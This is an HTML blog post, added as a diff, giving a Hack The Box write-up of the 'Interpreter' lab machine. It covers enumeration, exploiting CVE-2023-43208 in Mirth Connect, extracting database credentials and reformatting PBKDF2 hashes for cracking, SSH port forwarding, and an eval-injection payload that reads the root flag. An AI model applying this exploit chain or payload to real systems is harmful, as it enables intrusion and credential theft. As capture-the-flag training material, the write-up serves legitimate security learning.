@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Interpreter — Hack The Box Write-Up</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Main Site CSS -->
+  <link rel="stylesheet" href="../../style.css">
+
+  <!-- Blog CSS -->
+  <link rel="stylesheet" href="../blog.css">
+</head>
+<body>
+
+<!-- ✅ HEADER -->
+<header>
+  <div class="container">
+    <h1>
+      <a href="/" style="text-decoration:none; color:inherit;">
+        Anirudha Shinde
+      </a>
+    </h1>
+
+    <nav>
+      <a href="/">Home</a>
+      <a href="/#projects">Projects</a>
+      <a href="/blog/">Blog</a>
+      <a href="/#contact">Contact</a>
+    </nav>
+  </div>
+</header>
+
+<!-- ✅ MAIN CONTENT -->
+<main class="blog-container">
+
+  <article class="blog-post">
+
+    <h1>Interpreter — Hack The Box Write-Up</h1>
+    <p class="meta">23 Feb 2026 </p>
+
+    <h2>Summary</h2>
+    <p>Summary
+      Interpreter is a medium-difficulty Linux machine. Initial access is obtained by exploiting a pre-authentication Remote Code Execution (RCE) vulnerability in Mirth Connect 4.4.0 (CVE-2023-43208). Privilege escalation is achieved through a Python eval() injection vulnerability present in a localhost-only Flask application.
+    </p>
+
+      <h2>Enumeration</h2>
+      <h4>Nmap Scan</h4>
+      <pre><code>
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-21 19:26 EST
+Nmap scan report for 10.129.1.173
+Host is up (0.24s latency).
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+| ssh-hostkey:
+|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
+|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
+80/tcp   open  http     Jetty
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: Mirth Connect Administrator
+443/tcp  open  ssl/http Jetty
+| ssl-cert: Subject: commonName=mirth-connect
+| Not valid before: 2025-09-19T12:50:05
+|_Not valid after:  2075-09-19T12:50:05
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Mirth Connect Administrator
+| http-methods:
+|_  Potentially risky methods: TRACE
+6661/tcp open  unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 66.60 seconds
+
+      </code></pre>
+      <p>A full TCP scan revealed the following services:<br>
+      <ul>
+        <li>22/tcp — SSH</li>
+        <li>80/tcp — HTTP</li>
+        <li>443/tcp — HTTPS</li>
+        <li>6661/tcp — Unknown service</li>
+      </ul>
+
+Both HTTP and HTTPS served the Mirth Connect Administrator interface, indicating the presence of a healthcare integration engine.</p>
+
+        <img src="/blog/posts/images/post_2/1.png" alt="">
+    <p>Clicking the “Launch Mirth Connect Administrator” button downloads a webstart.jnlp file.</p>
+
+        <img src="/blog/posts/images/post_2/2.png" alt="">
+
+        <p>When a service version is identified, I immediately check for known vulnerabilities (CVEs), prioritizing Remote Code Execution (RCE).</p>
+
+        <h2>Initial Access</h2>
+        <h3>CVE-2023-43208</h3>
+        <p>Mirth Connect version 4.4.0 is vulnerable to CVE-2023-43208, a critical unauthenticated Remote Code Execution vulnerability caused by an incomplete patch of a prior deserialization flaw.<br>
+
+            Impact:<br>
+              • Pre-authentication RCE <br>
+              • Full system compromise
+        </p>
+
+        <h3><a href="https://github.com/gotr00t0day/NextGen-Mirth-Connect-Exploit">Proof of Concept</a></h3>
+        <p>This is POC  for the CVE, Previously i tried a lot of poc’s but some not working cuz of pythons latest version , version mismatch b/w python libraries, But from Discord some one posted this working link and it worked.
+        </p>
+        <br>
+        <p>By following the instruction metioned int the github readme file we can get successful reverse shell.</p>
+
+        <h2>Post-Exploitation</h2>
+        <p>Local enumeration identified sensitive configuration files</p>
+        <pre>/opt/mirthconnect/conf/mirth.properties</pre>
+        <p>This file exposed plaintext MySQL credentials, enabling database access and extraction of stored password hashes.</p>
+
+        <h4>Password Hash Analysis</h4>
+        <p>Extracted hashes were Base64-encoded.</p>
+        <p>Note : <br>
+           Mirth Connect 4.4.0 uses PBKDF2-HMAC-SHA256 with 600,000 iterations. The 8-byte salt
+           is prepended to the 32-byte hash within the Base64 string
+        </p>
+        <br>
+        <p>A python program to seperate and decode the base64 hash with salt</p>
+        <pre><code>
+import base64
+data = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')
+salt = base64.b64encode(data[:8]).decode()
+hash_ = base64.b64encode(data[8:]).decode()
+print(f'sha256:600000:{salt}:{hash_}')
+        </code></pre>
+        <p>Why this Matter ?</p>
+        <p>Cracked credentials allowed SSH login as sedric, transitioning from application compromise to system-level access.</p>
+
+        <h2>Privilege Escalation</h2>
+        <h4>Local Enumeration</h4>
+        <p>After obtaining a shell as sedric, I performed local enumeration to identify privilege escalation vectors.
+        </p>
+        <p>Running:</p>
+        <pre>ss -lntp</pre>
+        <img src="/blog/posts/images/post_2/3.png" alt="">
+        <p>revealed multiple listening services, including a localhost-only Flask application on port 54321.</p>
+        <br>
+
+        <img src="/blog/posts/images/post_2/4.png" alt="">
+        <p>It is an http server. I don’t see any header info here and curl is not installed on this machine so i forward this port to my kali machine with ssh localport forwarding and then curl the my machine to check hearder and endpoint fuzzing</p>
+
+        <h4>Port Forwarding</h4>
+        <pre>ssh -L 54321:127.0.0.1:54321 sedric@interpreter.htb</pre>
+        <br>
+
+        <img src="/blog/posts/images/post_2/5.png" alt="">
+        <p>It is python server , probably flask ! <br>
+          if is python then must be running process with python3</p>
+        
+        <h4>Source Code Analysis</h4>
+        <img src="/blog/posts/images/post_2/5.png" alt="">
+        <br>
+
+        <p>Reviewing the Flask application source revealed a dangerous pattern:<br>val(f"f'''{template}'''")</p>
+
+        <h4>Eval Injection Vulnerability</h4>
+        <p>User-supplied data is embedded into an f-string and evaluated using Python’s eval().<br>
+This creates a classic arbitrary code execution vulnerability.</p>
+        <br>
+        <p>eval() executes Python expressions directly, meaning any attacker-controlled input reaching this function can lead to Remote Code Execution.</p>
+        <br>
+        <h4>Input Filter Analysis</h4>
+        <pre>A regex filter attempted to sanitize input:
+^[a-zA-Z0-9._'\"(){}=+/]+$</pre>
+        <pre>Blocked characters:
+• spaces
+• commas
+• shell metacharacters (&, $, >, <)
+
+Allowed characters:
+• letters
+• numbers
+• Python syntax components</pre>
+
+        <br>
+        <h4>Payload Development</h4>
+  <pre>
+        import requests
+        xml = '''<?xml version='1.0'?>
+        &lt;patient&gt;
+        &lt;firstname&gt;{open('/root/root.txt').read()}&lt;/firstname&gt;
+        &lt;lastname&gt;test&lt;/lastname&gt;
+        &lt;sender_app&gt;test&lt;/sender_app&gt;
+        &lt;timestamp&gt;test&lt;/timestamp&gt;
+        &lt;birth_date&gt;01/01/1990&lt;/birth_date&gt;
+        &lt;gender&gt;M&lt;/gender&gt;
+        &lt;/patient&gt;'''
+        r = requests.post('http://127.0.0.1:54321/addPatient', data=xml, headers={'Content-Type':'application/xml'})
+        print(r.text)
+    </pre>
+
+    <br>
+    <h3>Lessons Learned</h3>
+        <ul>
+          <li>always inspect localhost services after foothold</li>
+          <li>eval() + f-strings = critical vulnerablility</li>
+          <li>Regex filters</li>
+          <li>payload development under input constrainsts</li>
+        </ul>
+
+
+    </main> <!-- ✅ FOOTER -->
+<footer>
+  <div class="container">
+    <p>© 2026 Anirudha Shinde • Blog</p>
+  </div>
+</footer>
+
+</body>
+</html>
+
